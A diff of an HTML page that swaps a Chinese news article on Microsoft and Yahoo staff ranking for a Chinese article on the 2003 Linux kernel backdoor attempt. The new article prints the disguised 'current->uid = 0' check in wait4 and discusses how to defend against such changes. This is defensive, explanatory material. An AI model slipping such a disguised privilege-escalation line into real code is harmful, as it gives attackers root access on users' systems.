@@ -1,51 +1,24 @@
-<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>钟型曲线——微软对现有的员工排名制度开刀而雅虎却依此裁员600人</h3><p>近期，雅虎依据去年引入的一套员工评估系统（钟型曲线）裁员600名。与此同时，微软却正开始着手对其存在多年的员工排名（Stack Ranking）制度进行改革，以缓解其自身的员工压力。</p>
-<p>据AllThingsD的报道（译注：AllThingsD是一家致力于报导高新技术、互联网及媒体新闻的网站）——在雅虎新首席执政官Marissa Mayer的倡导下，雅虎在去年引入了一套员工评价系统。这直接导致了过去几周中，雅虎大刀阔斧地进行了公司<a href="http://allthingsd.com/20131108/because-marissa-said-so-yahoos-bristle-at-mayers-new-qpr-ranking-system-and-silent-layoffs/">裁员600名</a>。然而，该评估系统却遭到了雅虎管理层的反对。这是因为雅虎要求管理层必须在团队中必须选出表现不佳的成员，而这仅仅是为了遵循钟型曲线（Bell Curve）为依据评估系统的指标：</p>
+<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /></head><body><h3>回顾Linux内核后门</h3><p>由于最近大众对美国国家安全局（NAS）的关注，人们的注意力转移到后门程序上。对于不熟悉该术语的人们，后门是一种有意在操作系统或软件中植入的漏洞，允许未授权的用户访问系统。在2003年曾经有人试图向Linux内核植入后门，虽然被发现了，但是这表明不论看上去多普通的变更都会引入漏洞，以及源码控制管理的重要性。</p>
+<p>Corbet在<a href="https://lwn.net/Articles/57135/">LVN.Net的文章</a>中首次提到以下这段代码，它把自己伪装成类似<a href="http://linux.die.net/man/2/wait4">wait4</a>函数的参数校验。</p>
+<pre>
+    if((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid = 0))
+        retval = -EINVAL;
+</pre>
+<p>正常情况下没有任何影响，但是如果调用程序故意传入非法值，if表达式的第二部分就会执行。该部分会将程序的用户ID（current-&gt;uid）设为0,在Linux中就是root用户。</p>
+<p>一眼看上去这就像是一个简单的代码错误，开发人员经常疏忽将'=='写成'='。虽然你认为函数wait4不应该与用户ID有任何关系，但是很明显这是故意为为之。</p>
+<p>Corbet描述了该后门是如何被发现的</p>
 <blockquote>
- 我不得不对某位员工给出几次“未达标”，而对此我感到非常不舒服。现在，我不得不在我的季度绩效评审会议中对此进行讨论。而就我个人而言，为了满足钟型曲线的指标，我不得不告诉我的员工我必须给他们几次“未达标”。这样做令我感到很不舒服，因为事实上这些员工并非如此。我理解我们必须末位淘汰，但这种评估手段是有问题的。我尝试以理服人，但我们该怎样给员工交待呢？
+  CVS库中的每个变更都会包含反向链接信息，表明与BitKeeper中的变更相同。有问题的变更缺少这样的信息，所以很快就能辨认出来。 
+ <br /> 
+ <br /> 试图通过这种方式进行变更是很可疑的，至少可以这么说，所以我们非常关注变更请求到底是什么。
 </blockquote>
-<p>通过雅虎内部的匿名消息公告，一名雅虎员工认为这样的评估系统也应该应用在对管理层的考核中：</p>
+<p>攻击者曾经再次向BitKeeper库的CVS克隆库中植入后门。他继续说道</p>
 <blockquote>
- 该员工问道：这样的几次“未达标”是否也应该同样应用于L2和L3的执行管理层？在每次的目标评审会议中，我们都注意到有些资深员工甚至有70%的目标“未达标”。如此一来，根据评估系统的定义，这种情况属于“未达标”一类。只要有2次“未达标”，公司就能撵那个人走。如果这样做没错，我们为何看不到处于公司顶层的执行官或其他高层也有“未达标”现象，（也许他们能够自己设置防护措施以保证他们的目标能够被“达到”），我们现在并未看到高层被裁掉的例子。
+  CVS代码库是从BitKeeper生成的，但是补丁程序进入BitKeeper代码库并不经过它。所以有问题的代码只会影响基于CVS代码库工作的用户。发行商使用的内核不是来自该库，这次事故也说明，问题代码能够驻留很长一段时间。
 </blockquote>
-<p>与此同时，微软即将离任的首席执行官Steve Ballmer已经决定摒弃微软实行多年的“员工排名”制度（Stack Ranking）。无论是公司内部还是外部都认为该员工评估系统是微软历史上最狗血的流程：</p>
-<blockquote> 
- <a href="http://www.theverge.com/2013/11/12/5094864/microsoft-kills-stack-ranking-internal-structure">The Verge</a>：Vanity Fair的著名编辑Kurt Eichenwald曾指责微软的一系列基于Windows系统及Office软件的狂热行为，并将公司内部的“员工排名”制度称作为
- <a href="http://www.theverge.com/2012/7/3/3134719/microsoft-windows-office-loyalty-lost-decade">“失落的一代”及食人文化</a>。Eichenwald曾面谈过一些前微软员工及微软的现员工，他们都觉得“员工排名”制度是软件巨人内部最狗血的流程。
- <br /> 
- <br /> 
- <a href="http://www.businessweek.com/articles/2013-11-13/microsoft-kills-its-hated-stack-rankings-dot-does-anyone-do-employee-reviews-right">Bloomberg Businessweek</a>：前微软员工David Auerback近期在接受Bloomberg Businessweek的访问时，告诉记者“员工排名”制度让员工感到无助并似乎“
- <a href="http://www.businessweek.com/articles/2013-11-07/the-annual-performance-review-worthless-corporate-ritual">鼓励人们在同事背后捅刀子</a>”。
- <br /> 
- <br /> 
- <a href="http://www.forbes.com/sites/petercohan/2013/11/13/marissas-second-epic-fail-microsoft-abolishes-stack-ranking-as-yahoo-ramps-it-up/">福布斯（Forbes）</a>：“员工排名”制度强制管理者对自己的员工进行评级并干掉底层的员工，这是微软的Steve Ballmer从通用电气学来的可怕理论。正如我在
- <a href="http://www.forbes.com/sites/petercohan/2012/07/13/why-stack-ranking-worked-better-at-ge-than-microsoft/">2012年7月</a>的文章中写道的，微软的“员工排名”制度就是一团乱麻。
- <br /> 
- <br /> 
- <a href="http://online.wsj.com/news/articles/SB10001424052702303460004579193951987616572">华尔街日报（The Wall Street Journal）</a>：虽然“员工排名”制度是首席执行官
- <a href="http://topics.wsj.com/person/B/Steve-Ballmer/599">Steve Ballmer</a>之所以获得众多奖金及公司期权奖励的关键因素，而他在今年8月宣布自己计划在一年内退休。然而许多微软的前员工与现员工抱怨道，该系统只能带来变化无常的绩效级别、管理者之间的权力斗争以及员工之间的非正常竞争。
-</blockquote>
-<p>根据微软人力资源主任Lisa Brummel发给全体员工的<a href="http://www.theverge.com/2013/11/12/5094864/microsoft-kills-stack-ranking-internal-structure">内部声明</a>，今后微软不会再有“曲线”也不会再有“排名”。未来，微软反倒会把更多的重点放在员工成长与团队协作上：</p>
-<blockquote> 
- <b>员工考察的重点会转移到团队精神与协作上</b>。对于什么是我们所期待的成功的绩效，未来我们将给出更具体的定义。我们将集中在3个因素上——不仅仅停留在自己的工作上、鼓励员工从他人的建议中得到启发尊重别人的意见、能够帮助别人成功。更重要的是这3点加起来能够带来更大的商业影响力。
- <br /> 
- <br /> 
- <b>员工考察的重点会转移到员工成长与发展上</b>。通过一个叫作“连接”的流程，我们将逐渐优化更及时的反馈及更有意义的讨论，以此帮助我们的员工学习成长并获得更大的收获。考评的周期将和每个业务部门的节奏挂钩，我们将引入更灵活的绩效讨论及发展机制，而不是整个公司就遵循一个时间线。我们相信这个新的方法将会适应我们加速的业务发展周期以及团队运作的不同规划。
-</blockquote>
-<p>许多公司所应用的钟型曲线（Bell Curve）排名制度是由通用电气的首席执行官Jack Welch在80年代所兴起的，但他们中的一些公司<a href="http://www.businessweek.com/articles/2013-11-13/microsoft-kills-its-hated-stack-rankings-dot-does-anyone-do-employee-reviews-right">已经开始摒弃这种方法</a>其中包括了Adobe和Expedia。这种评估制度的中心思想在于，公司认为每个公司员工的绩效将遵循一个钟型曲线即存在一小撮的高绩效员工以及一小撮的低绩效员工（“未达标”）。人们认为该制度能够定位并劝退那小部分的低绩效员工，从而提升整体的绩效水平。人们还认为执行该制度能够得到更小的标准偏差以获得更和谐的公司环境，正如下图表所示（<a href="http://web.mit.edu/chintanv/www/Publications/Chintan%20Vaishnav%20Punishing%20by%20Rewards%20for%20Publication%20Final.pdf">由文章“通过奖励的惩罚：当绩效钟型曲线不再适用</a>”）：</p>
-<blockquote> 
- <p><a href="http://www.infoq.com/resource/news/2013/11/stack-ranking-microsoft-yahoo/en/resources/bell-curve-1.png" target="_blank"><img title="image" style="border: 0px currentcolor; border-image: none; display: inline; background-image: none;" alt="image" src="http://www.infoq.com/resource/news/2013/11/stack-ranking-microsoft-yahoo/en/resources/bell-curve-1.png" border="0" _href="img://bell-curve-1.png" _p="true" /></a></p> 
-</blockquote>
-<p>但过去的某些研究学术表明该钟型排名制度有着一系列的缺点。“最佳与其他人：重审个人绩效普遍性的范式”一文表明帕累托（Paretian）分布比起高斯（Gaussian）分布能适合代表绩效曲线的图形，正如下图表所示：</p>
-<blockquote> 
- <p><a href="/resource/news/2013/11/stack-ranking-microsoft-yahoo/en/resources/bell-curve-2.png" target="_blank"><img title="image" style="border: 0px currentcolor; border-image: none; display: inline; background-image: none;" alt="image" src="http://www.infoq.com/resource/news/2013/11/stack-ranking-microsoft-yahoo/en/resources/bell-curve-2.png" border="0" _href="img://bell-curve-2.png" _p="true" /></a></p> 
-</blockquote>
-<p>根据该研究表明绝大多数的员工属于低绩效者（左边），而仅仅只有一小部分员工是高绩效员工（右边）。这项研究并非建议保留最佳绩效者而把所有其他人都开除，相反研究鼓励“有选择地为某些关键岗位挑选更佳员工，以便他们能够充分发挥所长提高公司业绩”。</p>
-<p>另一项学术——“<a href="http://web.mit.edu/chintanv/www/Publications/Chintan%20Vaishnav%20Punishing%20by%20Rewards%20for%20Publication%20Final.pdf">通过奖励的惩罚：当绩效钟型曲线不再适用</a>”则列举了钟型曲线排名制度的种种问题，这包括了该制度下员工产生的压力：</p>
-<blockquote>
-  我们观察到当这种压力维持在某个程度时，这将导致更高的绩效。相反如果一味的裁员，该种压力将大大减弱员工士气从而导致低绩效。当底部的低绩效员工离开后，钟型曲线的不灵活性将迫使管理者把那些曾经的高绩效者（与劳动力市场的其他人相比）归为中庸。更有甚者在一个规模逐渐缩小的公司里，管理者往往很难区别员工的绩效。在到达某个程度后，社会资本的消亡将成为公司的羁绊。
-</blockquote>
-<p>这项学术的建议是在压力和士气之间保持平衡，从而消除以裁员为目的的绩效评估。</p>
-<blockquote>
- 我们建议灵活地采用办钟型曲线的排名制度，不固定分布的百分比而去奖励真正的最佳绩效者。此外，我们建议平衡压力与士气。我们意识到特别是在规模逐渐缩小的公司里，这种平衡是非常难维持的。我们能预见的唯一方式是将压力保持在最佳的水平，并将士气维持在较高的水平。这样才有可能在某种程度上消除以裁员为目的的绩效评估流程所带来的问题。
-</blockquote>
-<p><b>查看英文原文：</b><a href="http://www.infoq.com/news/2013/11/stack-ranking-microsoft-yahoo">Microsoft Ditches the Stack Ranking System. Yahoo! Lays off 600 because of It</a></p><br><br><br><br><br><br></body></html>
+<p>大家想象一下，如果有人向代码库发起这样的攻击，增加几行看上去很好的代码，实际上植入了一个后门，而代码库没有Linux内核团队的控制和严格检查，你如何保护自己不受攻击。</p>
+<p>一种方式是在应用程序中创建自己的“内核”，只有这段代码可以改变用户的角色和权限。其他的代码只是获取到用户权限的只读视图，这样他们就不能轻易得获取root权限。</p>
+<p>在这样的模型中，&quot;current-&gt;uid=0&quot;这样的代码不会编译。如果任何人想实施攻击，或是直接修改应用程序的安全模块，但是我们会密切关注这样的修改，或是使用反射的伎俩，但是反射代码肯定比简单的赋值操作更容易被察觉到。</p>
+<p>如果语言层面支持，一种更好的方式是使用户权限完全不可变。这种方式能够更大程度限制攻击发生的地方，只能是创建权限的地方。</p>
+<p>这些措施应该配合对源码控制服务器的限制进行实施。一是限制尽可能少的人向主分支中提交代码，而不是过于开放；二是安全敏感代码默认应该完全锁定，只能根据问题具体情况授予编辑权限，实施的具体方法依赖此人是否使用分布式或集中式的源码控制以及具体的产品。</p>
+<p>如果没有在变更代码成为产品之前进行审计，最终这些技术都会失效，这些措施只能减少审计疏漏问题发生的可能性。</p><br><br><br><br><br><br></body></html>
